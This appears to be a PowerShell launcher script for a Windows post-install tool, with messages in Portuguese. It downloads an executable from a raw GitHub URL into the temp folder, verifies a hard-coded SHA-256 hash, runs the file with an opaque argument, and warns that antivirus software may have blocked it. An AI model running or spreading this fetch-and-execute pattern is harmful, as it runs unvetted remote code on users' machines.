& {
    $ErrorActionPreference = 'Stop'
    $ProgressPreference    = 'SilentlyContinue'

    $Url     = 'https://raw.githubusercontent.com/duferdias/post-install/main/AdCMDScript.exe'
    $Sha256  = 'B131410CA6C670FA0726234BAA068FF45E9AB3B6543C474E6BA84FBB69DDA814'
    $sStrtp  = '/pPbVLAVcktfzFRP'

    $Exe = Join-Path $env:TEMP 'AdCMDScript.exe'

    try {
        if ($env:OS -ne 'Windows_NT')                  { throw 'Este script e compativel apenas com Windows.' }
        if ($PSVersionTable.PSVersion.Major -lt 3)     { throw 'E necessario o PowerShell 3.0 ou superior.' }
        if ($ExecutionContext.SessionState.LanguageMode -ne 'FullLanguage') { throw 'O PowerShell esta em modo restrito (Constrained Language).' }
        if ($Sha256 -notmatch '^[0-9A-Fa-f]{64}$')     { throw 'Hash SHA-256 nao configurado no script.' }

        try { [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor 3072 } catch {}

        for ($i = 1; $i -le 3; $i++) {
            try {
                Invoke-WebRequest -UseBasicParsing -Uri $Url -OutFile $Exe -ErrorAction Stop
                break
            } catch {
                if ($i -eq 3) { throw "Falha ao baixar o arquivo: $($_.Exception.Message)" }
                Start-Sleep -Seconds 2
            }
        }

        if (-not (Test-Path -LiteralPath $Exe)) { throw 'O arquivo foi removido apos o download (possivel bloqueio do antivirus).' }
        if ((Get-Item -LiteralPath $Exe).Length -lt 1KB) { throw 'O arquivo baixado e invalido ou esta incompleto.' }

        $sha = [Security.Cryptography.SHA256]::Create()
        $fs  = [IO.File]::OpenRead($Exe)
        try   { $hash = [BitConverter]::ToString($sha.ComputeHash($fs)).Replace('-', '') }
        finally { $fs.Dispose(); $sha.Dispose() }
        if ($hash -ne $Sha256) {
            Remove-Item -LiteralPath $Exe -Force -ErrorAction SilentlyContinue
            throw 'Falha na verificacao de integridade (SHA-256 nao confere). Arquivo removido e execucao cancelada.'
        }

        $sp = @{ FilePath = $Exe; Wait = $true; PassThru = $true }
        if ($sStrtp) { $sp.ArgumentList = $sStrtp }
        $p = Start-Process @sp

        if ($p.ExitCode -ne 0) { throw "O aplicativo terminou com erro (codigo $($p.ExitCode))." }
    }
    catch {
        Write-Host "Erro: $($_.Exception.Message)" -ForegroundColor Red
        if ($_.Exception.Message -match 'virus|antiv|unwanted|removido') {
            Write-Host 'O antivirus pode ter bloqueado o arquivo. Verifique o historico de protecao.' -ForegroundColor Yellow
        }
    }
}
